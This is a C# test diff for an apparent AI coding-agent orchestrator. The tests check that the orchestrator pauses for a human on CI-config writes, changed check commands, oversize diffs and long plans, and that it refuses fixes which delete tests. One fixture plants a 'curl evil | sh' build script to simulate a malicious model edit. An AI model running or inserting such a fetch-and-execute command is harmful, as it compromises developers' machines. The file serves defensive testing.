@@ -155,7 +155,9 @@ public class OrchestratorTests : IAsyncLifetime
         Assert.Contains("- unused: Never chosen.", PromptOf(AgentRole.TaskPlanner));
         Assert.Equal(["fluent-ui-blazor", "fixer-notes"], (await _store.GetSubtasksAsync(run.Id)).Single().Skills);
         foreach (var role in new[] { AgentRole.ContextSpecifier, AgentRole.CodeGenerator, AgentRole.BugFixer })
-            Assert.Contains("## Skills. Follow these instructions for this subtask\n\n### fluent-ui-blazor\n\nUse FluentButton", PromptOf(role));
+            Assert.Contains("## Skills. Follow these instructions for this subtask\n\n<skill-", PromptOf(role));
+        foreach (var role in new[] { AgentRole.ContextSpecifier, AgentRole.CodeGenerator, AgentRole.BugFixer })
+            Assert.Contains("\n### fluent-ui-blazor\n\nUse FluentButton", PromptOf(role));
         Assert.DoesNotContain("Read the first error", PromptOf(AgentRole.CodeGenerator));
         Assert.Contains("### fixer-notes\n\nRead the first error before the rest.", PromptOf(AgentRole.BugFixer));
         Assert.DoesNotContain("Unused instructions", PromptOf(AgentRole.BugFixer));
@@ -597,6 +599,400 @@ public class OrchestratorTests : IAsyncLifetime
 
         Assert.Equal(1, (await _store.GetSubtasksAsync(run.Id)).Single().FixAttempts);
         Assert.Contains("Use the other API", _llm.Calls.Last(c => c.Role == AgentRole.BugFixer).Prompt);
+    }
+
+    private static string PlanCreating(string title, params string[] files) => JsonSerializer.Serialize(
+        new TaskGraphResponse([new SubtaskDto(1, title, $"Build {title}", [], files.ToList(), [], "")]), LlmSchemas.SerializerOptions);
+
+    private static string Patch(params (string File, string Action, string Content)[] operations) => JsonSerializer.Serialize(
+        new FilePatchSetResponse("Changed files", operations.Select(o => new FileOperationDto(o.File, o.Action, o.Content)).ToList()), LlmSchemas.SerializerOptions);
+
+    [Fact]
+    public async Task A_write_to_ci_config_outside_the_subtasks_files_pauses_the_run_and_writes_nothing()
+    {
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch(("alpha.txt", FileActions.Create, "code"), ("./.github/workflows/x.yml", FileActions.Create, "on: push")));
+
+        var run = await WaitForAsync((await StartAsync()).Id, RunStatus.NeedsHuman);
+
+        Assert.Contains("wants to write `.github/workflows/x.yml`", run.PauseReason);
+        Assert.False(File.Exists(_repo.File(".github/workflows/x.yml")));
+        Assert.False(File.Exists(_repo.File("alpha.txt"))); // The whole patch is held back.
+        Assert.Equal(SubtaskStatus.NeedsHuman, (await _store.GetSubtasksAsync(run.Id)).Single().Status);
+    }
+
+    [Fact]
+    public async Task A_write_to_ci_config_is_applied_when_the_plan_lists_it()
+    {
+        _llm.Enqueue(AgentRole.TaskPlanner, PlanCreating("alpha", "alpha.txt", ".github/workflows/x.yml"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch(("alpha.txt", FileActions.Create, "code"), (".github/workflows/x.yml", FileActions.Create, "on: push")));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+
+        await WaitForAsync((await StartAsync()).Id, RunStatus.ReadyToMerge);
+
+        Assert.True(File.Exists(_repo.File(".github/workflows/x.yml")));
+    }
+
+    [Fact]
+    public async Task A_fix_that_deletes_a_test_is_refused_and_reported_back_but_editing_it_is_allowed()
+    {
+        _repo.Write("tests/AlphaTests.cs", "class AlphaTests { }\n");
+        await _git.StageAllAsync();
+        await _git.CommitStagedAsync("Add a test");
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"));
+        _llm.Enqueue(AgentRole.BugFixer,
+            Patch(("tests/AlphaTests.cs", FileActions.Delete, "")),
+            Patch(("tests/AlphaTests.cs", FileActions.Overwrite, "class AlphaTests { /* fixed */ }\n")));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+        _commands.Results.Enqueue((1, "AlphaTests failed"));
+
+        var run = await WaitForAsync((await StartAsync()).Id, RunStatus.ReadyToMerge);
+
+        var fixes = _llm.Calls.Where(c => c.Role == AgentRole.BugFixer).ToList();
+        Assert.Equal(2, fixes.Count);
+        Assert.Contains("A fix may not delete tests or change the files that define the check", fixes[1].Prompt);
+        Assert.Contains(await _store.GetLogsAsync(run.Id), l => l.Message.StartsWith("Didn't apply the Bug Fixer's change: it deleted a test"));
+        Assert.Equal("class AlphaTests { /* fixed */ }\n", File.ReadAllText(_repo.File("tests/AlphaTests.cs")));
+        Assert.Equal(1, (await _store.GetSubtasksAsync(run.Id)).Single().FixAttempts); // The refusal was no attempt.
+    }
+
+    [Fact]
+    public void Gate_tampering_covers_tests_and_the_files_that_define_the_check_unless_planned()
+    {
+        var subtask = new FactorySubtask { TargetFilesToModify = ["Makefile"] };
+        FilePatchSetResponse Patch(params (string File, string Action)[] ops) => new("x", ops.Select(o => new FileOperationDto(o.File, o.Action, "")).ToList());
+        string[] Tampered(params (string File, string Action)[] ops) => [.. FactoryOrchestrator.TamperedGateFiles(_repo.Path, subtask, Patch(ops))];
+
+        Assert.Equal(["src/FooTests.cs"], Tampered(("src/FooTests.cs", "DELETE")));
+        Assert.Equal(["web/a.spec.ts"], Tampered(("web/a.spec.ts", "DELETE")));
+        Assert.Equal(["pkg/__tests__/x.js"], Tampered(("pkg/__tests__/x.js", "DELETE")));
+        Assert.Empty(Tampered(("src/FooTests.cs", "OVERWRITE"), ("src/FooTests.cs", "EDIT")));
+        Assert.Equal(["package.json"], Tampered(("./package.json", "EDIT")));
+        Assert.Equal(["App.sln", "tests/Foo.Tests.csproj", "go.mod"], Tampered(("App.sln", "EDIT"), ("tests/Foo.Tests.csproj", "OVERWRITE"), ("go.mod", "DELETE")));
+        Assert.Empty(Tampered(("src/Foo.csproj", "EDIT"), ("src/Latest.cs", "DELETE")));
+        Assert.Equal(["test_foo.py", "pkg/foo_test.go", "FooTests.cs", "web/foo.spec.ts", "Specs/a.rb"],
+            Tampered(("test_foo.py", "DELETE"), ("pkg/foo_test.go", "DELETE"), ("FooTests.cs", "DELETE"), ("web/foo.spec.ts", "DELETE"), ("Specs/a.rb", "DELETE")));
+        Assert.Empty(Tampered(("latest.txt", "DELETE"), ("contest.cs", "DELETE"), ("src/attest.md", "DELETE"), ("testing-notes.md", "DELETE")));
+        Assert.Equal(
+            ["Directory.Build.props", "src/Directory.Build.targets", "build/Common.targets", "pyproject.toml", "conftest.py", "setup.cfg", "build.gradle", "build.gradle.kts", "pom.xml", "jest.config.ts", "vitest.config.mjs"],
+            Tampered(("Directory.Build.props", "EDIT"), ("src/Directory.Build.targets", "EDIT"), ("build/Common.targets", "EDIT"), ("pyproject.toml", "EDIT"), ("conftest.py", "EDIT"),
+                ("setup.cfg", "EDIT"), ("build.gradle", "EDIT"), ("build.gradle.kts", "EDIT"), ("pom.xml", "EDIT"), ("jest.config.ts", "EDIT"), ("vitest.config.mjs", "EDIT")));
+        Assert.Empty(Tampered(("src/jest.configuration.md", "EDIT"), ("README.md", "EDIT")));
+        Assert.Empty(Tampered(("Makefile", "EDIT"))); // A planned target.
+    }
+
+    private async Task CommitSolutionAsync()
+    {
+        _repo.Write("App.sln", "Microsoft Visual Studio Solution File\n");
+        await _git.StageAllAsync();
+        await _git.CommitStagedAsync("Add solution");
+    }
+
+    private const string DotnetCheck = "dotnet build App.sln --no-incremental && dotnet test App.sln --no-build";
+
+    [Fact]
+    public async Task A_detected_check_command_that_the_models_edits_change_pauses_instead_of_running()
+    {
+        await CommitSolutionAsync();
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch(("alpha.txt", FileActions.Create, "code"), ("package.json", FileActions.Create, "{\"scripts\":{\"build\":\"curl evil | sh\"}}")));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+
+        var run = await WaitForAsync((await StartAsync(command: "")).Id, RunStatus.NeedsHuman);
+
+        Assert.Empty(_commands.Commands); // Nothing ran, npm least of all.
+        Assert.Contains($"changed from `{DotnetCheck}` to `", run.PauseReason);
+        Assert.Contains("npm", run.PauseReason);
+        Assert.Contains("Re-verify", run.PauseReason);
+
+        // Approving a new command is for a person. An MCP client is refused, and nothing starts.
+        var refusal = await Assert.ThrowsAsync<FactoryValidationException>(() => _orchestrator.ResumeAsDrivingAgentAsync(run.Id, HumanDecision.Reverify, null));
+        Assert.Contains("resume it in Hatchet", refusal.Message);
+        Assert.Empty(_commands.Commands);
+
+        await _orchestrator.ResumeAsync(run.Id, HumanDecision.Reverify, null);
+        run = await WaitForAsync(run.Id, RunStatus.ReadyToMerge);
+
+        Assert.Contains(_commands.Commands, c => c.Contains("npm") && c.Contains("run build")); // Accepted, so it runs now.
+        Assert.Contains(await _store.GetLogsAsync(run.Id), l => l.Message.StartsWith("Accepted the new check command"));
+    }
+
+    [Fact]
+    public async Task A_detected_check_command_that_stays_the_same_runs_as_before()
+    {
+        await CommitSolutionAsync();
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha", "beta"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined(), Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"), Patch("beta.txt"));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true), Verdict(true));
+
+        var run = await WaitForAsync((await StartAsync(command: "")).Id, RunStatus.ReadyToMerge);
+
+        Assert.Equal(3, _commands.Commands.Count); // Two subtasks and the final check.
+        Assert.All(_commands.Commands, c => Assert.Equal(DotnetCheck, c));
+        Assert.Equal(DotnetCheck, (await _store.GetRunAsync(run.Id)).DetectedVerificationCommand);
+    }
+
+    [Fact]
+    public async Task A_check_command_that_first_appears_during_the_run_is_recorded_and_run()
+    {
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch(("alpha.txt", FileActions.Create, "code"), ("App.sln", FileActions.Create, "sln")));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+
+        var run = await WaitForAsync((await StartAsync(command: "")).Id, RunStatus.ReadyToMerge);
+
+        Assert.Equal(DotnetCheck, _commands.Commands.First());
+    }
+
+    private static string Lines(int count) => string.Concat(Enumerable.Range(0, count).Select(i => $"line {i}\n"));
+
+    [Fact]
+    public async Task A_diff_over_the_limit_is_reviewed_in_parts_and_every_part_must_pass()
+    {
+        _settings.Settings.MaxDiffChars = 400;
+        _llm.Enqueue(AgentRole.TaskPlanner, PlanCreating("alpha", "a.txt", "b.txt"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch(("a.txt", FileActions.Create, Lines(12)), ("b.txt", FileActions.Create, Lines(12))));
+        _llm.Enqueue(AgentRole.BugFixer, Patch(("b.txt", FileActions.Overwrite, Lines(13))));
+        // The second part rejects, so the first pass fails; after the fix both parts pass.
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true), Verdict(false, "b.txt is wrong"), Verdict(true), Verdict(true));
+
+        var run = await WaitForAsync((await StartAsync()).Id, RunStatus.ReadyToMerge);
+
+        var reviews = _llm.Calls.Where(c => c.Role == AgentRole.StaticReviewer).ToList();
+        Assert.Equal(4, reviews.Count);
+        Assert.Contains("[Part 1 of 2 of this change]", reviews[0].Prompt);
+        Assert.Contains("[Part 2 of 2 of this change]", reviews[1].Prompt);
+        Assert.Contains("a.txt", reviews[0].Prompt);
+        Assert.DoesNotContain("b/b.txt", reviews[0].Prompt);
+        Assert.Contains("b.txt is wrong", _llm.Calls.Single(c => c.Role == AgentRole.BugFixer).Prompt);
+    }
+
+    [Fact]
+    public async Task A_short_diff_is_reviewed_in_one_call_without_a_part_note()
+    {
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+
+        await WaitForAsync((await StartAsync()).Id, RunStatus.ReadyToMerge);
+
+        var review = Assert.Single(_llm.Calls, c => c.Role == AgentRole.StaticReviewer);
+        Assert.DoesNotContain("Part 1 of", review.Prompt);
+    }
+
+    [Fact]
+    public async Task A_pass_that_lists_blocking_issues_is_treated_as_a_rejection()
+    {
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"));
+        _llm.Enqueue(AgentRole.BugFixer, Patch("alpha.txt", "v2"));
+        _llm.Enqueue(AgentRole.StaticReviewer,
+            JsonSerializer.Serialize(new ReviewVerdictResponse(true, 95, ["it deletes the audit log"], []), LlmSchemas.SerializerOptions),
+            Verdict(true));
+
+        var run = await WaitForAsync((await StartAsync()).Id, RunStatus.ReadyToMerge);
+
+        Assert.Contains("it deletes the audit log", _llm.Calls.Single(c => c.Role == AgentRole.BugFixer).Prompt);
+        Assert.Equal(2, _llm.Calls.Count(c => c.Role == AgentRole.StaticReviewer));
+    }
+
+    [Fact]
+    public async Task A_file_too_large_to_review_in_full_pauses_a_passing_review_until_the_human_carries_on()
+    {
+        _settings.Settings.MaxDiffChars = 400;
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt", Lines(200)));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true), Verdict(true)); // The second answers the review after resuming.
+
+        var run = await WaitForAsync((await StartAsync()).Id, RunStatus.NeedsHuman);
+
+        Assert.Contains("`alpha.txt`", run.PauseReason);
+        Assert.Contains("saw only the start", run.PauseReason);
+        Assert.Null((await _store.GetSubtasksAsync(run.Id)).Single().CommitSha);
+
+        await _orchestrator.ResumeAsync(run.Id, HumanDecision.Resume, null);
+        run = await WaitForAsync(run.Id, RunStatus.ReadyToMerge);
+
+        Assert.NotNull((await _store.GetSubtasksAsync(run.Id)).Single().CommitSha);
+        Assert.Contains(await _store.GetLogsAsync(run.Id), l => l.Message.Contains("as you chose to carry on"));
+    }
+
+    [Fact]
+    public async Task A_lock_file_too_large_to_review_in_full_is_committed_with_a_log_line()
+    {
+        _settings.Settings.MaxDiffChars = 400;
+        _llm.Enqueue(AgentRole.TaskPlanner, PlanCreating("alpha", "package-lock.json"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("package-lock.json", Lines(200)));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+
+        var run = await WaitForAsync((await StartAsync()).Id, RunStatus.ReadyToMerge);
+
+        Assert.Contains(await _store.GetLogsAsync(run.Id), l => l.Message.StartsWith("package-lock.json is a package lock file"));
+    }
+
+    [Fact]
+    public async Task A_generated_looking_file_name_does_not_exempt_an_oversize_file_from_review()
+    {
+        _settings.Settings.MaxDiffChars = 400;
+        _llm.Enqueue(AgentRole.TaskPlanner, PlanCreating("alpha", "Evil.Designer.cs"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("Evil.Designer.cs", Lines(200)));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+
+        var run = await WaitForAsync((await StartAsync()).Id, RunStatus.NeedsHuman);
+
+        Assert.Contains("`Evil.Designer.cs`", run.PauseReason);
+        Assert.Contains("saw only the start", run.PauseReason);
+    }
+
+    [Fact]
+    public async Task A_plan_longer_than_the_limit_from_the_planner_waits_for_approval_even_without_plan_review()
+    {
+        _settings.Settings.MaxPlannedSubtasks = 2;
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha", "beta", "gamma"));
+
+        var run = await WaitForAsync((await StartAsync(approval: false)).Id, RunStatus.AwaitingPlanApproval);
+
+        Assert.True(run.PlanHeldForUser);
+        Assert.Empty(_llm.Calls.Where(c => c.Role == AgentRole.CodeGenerator));
+        Assert.Contains(await _store.GetLogsAsync(run.Id), l => l.Message.Contains("planned 3 subtasks, more than the 2"));
+    }
+
+    [Fact]
+    public async Task A_plan_within_the_limit_runs_unattended_and_a_supplied_plan_is_not_limited()
+    {
+        _settings.Settings.MaxPlannedSubtasks = 2;
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha", "beta"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined(), Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"), Patch("beta.txt"));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true), Verdict(true));
+
+        var run = await WaitForAsync((await StartAsync(approval: false)).Id, RunStatus.ReadyToMerge);
+
+        Assert.False(run.PlanHeldForUser);
+    }
+
+    [Fact]
+    public async Task Guidance_sent_through_the_driving_agent_is_labelled_as_its_own_while_the_users_is_not()
+    {
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"));
+        _llm.Enqueue(AgentRole.BugFixer, Patch("alpha.txt", "1"), Patch("alpha.txt", "2"), Patch("alpha.txt", "3"), Patch("alpha.txt", "agent"));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+        for (var i = 0; i < 4; i++) _commands.Results.Enqueue((1, $"still broken {i}"));
+        var run = await WaitForAsync((await StartAsync()).Id, RunStatus.NeedsHuman);
+
+        await _orchestrator.ResumeAsDrivingAgentAsync(run.Id, HumanDecision.RetryFixer, "Use the other API");
+        run = await WaitForAsync(run.Id, RunStatus.ReadyToMerge);
+
+        var subtask = (await _store.GetSubtasksAsync(run.Id)).Single();
+        Assert.True(subtask.GuidanceFromAgent);
+        var prompt = _llm.Calls.Last(c => c.Role == AgentRole.BugFixer).Prompt;
+        Assert.Contains("Guidance from the driving agent", prompt);
+        Assert.Contains("Use the other API", prompt);
+        Assert.DoesNotContain("Use the other API", _llm.Calls.Last(c => c.Role == AgentRole.StaticReviewer).Prompt);
+    }
+
+    [Fact]
+    public async Task A_person_resuming_in_hatchet_replaces_the_agents_guidance_with_their_own()
+    {
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"));
+        _llm.Enqueue(AgentRole.BugFixer, Patch("alpha.txt", "1"), Patch("alpha.txt", "2"), Patch("alpha.txt", "3"), Patch("alpha.txt", "4"), Patch("alpha.txt", "5"));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+        for (var i = 0; i < 8; i++) _commands.Results.Enqueue((1, $"still broken {i}"));
+        var run = await WaitForAsync((await StartAsync()).Id, RunStatus.NeedsHuman);
+        await _orchestrator.ResumeAsDrivingAgentAsync(run.Id, HumanDecision.RetryFixer, "agent words");
+        run = await WaitForAsync(run.Id, RunStatus.NeedsHuman);
+
+        await _orchestrator.ResumeAsync(run.Id, HumanDecision.RetryFixer, "human words");
+        run = await WaitForAsync(run.Id, RunStatus.ReadyToMerge, RunStatus.NeedsHuman);
+
+        Assert.False((await _store.GetSubtasksAsync(run.Id)).Single().GuidanceFromAgent);
+        var prompt = _llm.Calls.Last(c => c.Role == AgentRole.BugFixer).Prompt;
+        Assert.DoesNotContain("Guidance from the driving agent", prompt);
+        Assert.Contains("human words", prompt);
+    }
+
+    [Fact]
+    public async Task The_driving_agent_may_reset_a_subtasks_fix_budget_three_times_but_the_user_may_always()
+    {
+        _settings.Settings.MaxFixRetries = 1;
+        _settings.Settings.EscalateFixesToClaudeAfter = 0;
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"));
+        _llm.Enqueue(AgentRole.BugFixer, Enumerable.Range(1, 8).Select(i => Patch("alpha.txt", $"v{i}")).ToArray());
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+        for (var i = 0; i < 5; i++) _commands.Results.Enqueue((1, $"distinct failure {i}"));
+        var run = await WaitForAsync((await StartAsync()).Id, RunStatus.NeedsHuman);
+
+        for (var reset = 1; reset <= FactoryOrchestrator.MaxAgentFixerResets; reset++)
+        {
+            await _orchestrator.ResumeAsDrivingAgentAsync(run.Id, HumanDecision.RetryFixer, null);
+            run = await WaitForAsync(run.Id, RunStatus.NeedsHuman);
+        }
+
+        var refusal = await Assert.ThrowsAsync<FactoryValidationException>(() => _orchestrator.ResumeAsDrivingAgentAsync(run.Id, HumanDecision.RetryFixer, null));
+        Assert.Contains("resume it in Hatchet", refusal.Message);
+        Assert.Equal(RunStatus.NeedsHuman, (await _store.GetRunAsync(run.Id)).Status); // Refused: nothing started.
+
+        await _orchestrator.ResumeAsync(run.Id, HumanDecision.RetryFixer, null);
+        await WaitForAsync(run.Id, RunStatus.ReadyToMerge);
+    }
+
+    private static List<SubtaskEdit> OneStep() => [new SubtaskEdit(null, "alpha", "Build alpha", [], ["alpha.txt"], [], "")];
+
+    [Fact]
+    public async Task The_driving_agent_cannot_approve_a_plan_the_user_asked_to_review()
+    {
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        var run = await WaitForAsync((await StartAsync(approval: true)).Id, RunStatus.AwaitingPlanApproval); // The default: asked for by the user.
+
+        var refusal = await Assert.ThrowsAsync<FactoryValidationException>(() => _orchestrator.ApprovePlanAsDrivingAgentAsync(run.Id, OneStep()));
+
+        Assert.Contains("approved in Hatchet's UI", refusal.Message);
+        Assert.Equal(RunStatus.AwaitingPlanApproval, (await _store.GetRunAsync(run.Id)).Status);
+    }
+
+    [Fact]
+    public async Task The_driving_agent_can_approve_a_plan_it_asked_to_review_itself()
+    {
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha"));
+        _llm.Enqueue(AgentRole.ContextSpecifier, Refined());
+        _llm.Enqueue(AgentRole.CodeGenerator, Patch("alpha.txt"));
+        _llm.Enqueue(AgentRole.StaticReviewer, Verdict(true));
+        var request = new NewRunRequest(_repo.Path, "# Spec", null, "verify", RequirePlanApproval: true, PlanReviewByUser: false); // What MCP start_run sends.
+        var run = await WaitForAsync((await _orchestrator.StartRunAsync(request)).Id, RunStatus.AwaitingPlanApproval);
+        Assert.False(run.Task.PlanReviewByUser);
+
+        await _orchestrator.ApprovePlanAsDrivingAgentAsync(run.Id, OneStep());
+        await WaitForAsync(run.Id, RunStatus.ReadyToMerge);
+    }
+
+    [Fact]
+    public async Task The_driving_agent_cannot_approve_a_plan_held_for_being_too_long()
+    {
+        _settings.Settings.MaxPlannedSubtasks = 1;
+        _llm.Enqueue(AgentRole.TaskPlanner, Plan("alpha", "beta"));
+        var request = new NewRunRequest(_repo.Path, "# Spec", null, "verify", RequirePlanApproval: false, PlanReviewByUser: false);
+        var run = await WaitForAsync((await _orchestrator.StartRunAsync(request)).Id, RunStatus.AwaitingPlanApproval);
+
+        await Assert.ThrowsAsync<FactoryValidationException>(() => _orchestrator.ApprovePlanAsDrivingAgentAsync(run.Id, OneStep()));
     }
 
     [Fact]
@@ -1964,7 +2360,8 @@ public class OrchestratorTests : IAsyncLifetime
         {
             Id = run.Id, TaskId = run.TaskId, Task = run.Task, Status = run.Status, CurrentStage = run.CurrentStage,
             CurrentSubtaskId = run.CurrentSubtaskId, PausedStage = run.PausedStage, PauseReason = run.PauseReason, PausedByUser = run.PausedByUser,
-            QueuedRequest = run.QueuedRequest,
+            QueuedRequest = run.QueuedRequest, DetectedVerificationCommand = run.DetectedVerificationCommand,
+            PendingVerificationCommand = run.PendingVerificationCommand, PlanHeldForUser = run.PlanHeldForUser,
             BranchName = run.BranchName, BaseBranch = run.BaseBranch, BaseCommit = run.BaseCommit, RepoMap = run.RepoMap,
             IntegrationPassed = run.IntegrationPassed, MergeCommit = run.MergeCommit, PromptTokens = run.PromptTokens,
             CompletionTokens = run.CompletionTokens, CreatedAt = run.CreatedAt, CompletedAt = run.CompletedAt
@@ -1976,7 +2373,7 @@ public class OrchestratorTests : IAsyncLifetime
             TargetFilesToModify = s.TargetFilesToModify, TargetFilesToCreate = s.TargetFilesToCreate, ContextFilesToRead = s.ContextFilesToRead,
             Skills = [.. s.Skills], VerificationCommand = s.VerificationCommand, CommandApproved = s.CommandApproved, Status = s.Status, IsIntegrationFix = s.IsIntegrationFix,
             FixAttempts = s.FixAttempts, ReviewFixAttempts = s.ReviewFixAttempts,
-            LastFailure = s.LastFailure, FixHistory = [.. s.FixHistory], HumanGuidance = s.HumanGuidance, RefinedSpecJson = s.RefinedSpecJson,
+            LastFailure = s.LastFailure, FixHistory = [.. s.FixHistory], HumanGuidance = s.HumanGuidance, GuidanceFromAgent = s.GuidanceFromAgent, ReviewGapAccepted = s.ReviewGapAccepted, AgentFixerResets = s.AgentFixerResets, RefinedSpecJson = s.RefinedSpecJson,
             SummaryOfChanges = s.SummaryOfChanges, ReviewJson = s.ReviewJson, CommitSha = s.CommitSha
         };
 
